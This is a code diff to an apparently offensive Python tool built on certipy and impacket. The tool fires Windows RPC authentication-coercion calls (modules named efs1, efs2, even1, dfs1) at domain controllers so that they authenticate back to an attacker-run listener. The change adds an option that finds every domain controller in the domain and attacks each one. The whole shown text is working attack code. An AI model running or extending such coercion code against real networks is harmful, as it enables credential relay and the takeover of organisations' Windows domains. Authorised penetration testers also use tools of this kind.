@@ -7,8 +7,10 @@ import time
 
 from certipy.lib.target import Target
 from concurrent.futures import ThreadPoolExecutor, wait
+from copy import deepcopy
 
 from bullets import Cannon, efs2, efs1, even1, dfs1
+from utils import get_all_dcs
 from impacket.examples import logger
 from certipy.commands.parsers import target
 
@@ -46,6 +48,7 @@ if __name__ == '__main__':
                         help="Show this help message and exit")
     parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-all-dc', action='store_true', help='Scan all dcs')
     target.add_argument_group(parser)
 
     parser.add_argument('-rpcs', nargs='+', choices=available_rpcs.keys(), default=('efs2',), help='rpcs to use')
@@ -64,8 +67,18 @@ if __name__ == '__main__':
     else:
         logging.getLogger().setLevel(logging.INFO)
     options.no_pass = True
+    targets = []
     t = Target.from_options(options)
-    listener = options.listener
+    targets = [t]
+    if options.all_dc:
+        dc_targets = []
+        dcs = get_all_dcs(t)
+        for dc in dcs:
+            tmp_target = deepcopy(t)
+            tmp_target.target_ip = dc
+            dc_targets.append(tmp_target)
+        targets = dc_targets
+
     time_start = time.time()
     with server:
         ip, port = server.server_address
@@ -81,9 +94,11 @@ if __name__ == '__main__':
 
         logging.info(f'{len(options.rpcs)} cannons loaded. fire!')
         for rpc in options.rpcs:
-            cannon = Cannon(**(available_rpcs.get(rpc))._asdict(), shooter=listener, target=t, delay=0.5, timeout=target.timeout)
-            cannon.shoot()
-            cannons.append(cannon)
+            for my_target in targets:
+                cannon = Cannon(**(available_rpcs.get(rpc))._asdict(), shooter=options.listener,
+                                target=my_target, delay=0.5, timeout=target.timeout)
+                cannon.shoot()
+                cannons.append(cannon)
 
 
         # with ThreadPoolExecutor(max_workers=10) as pool:
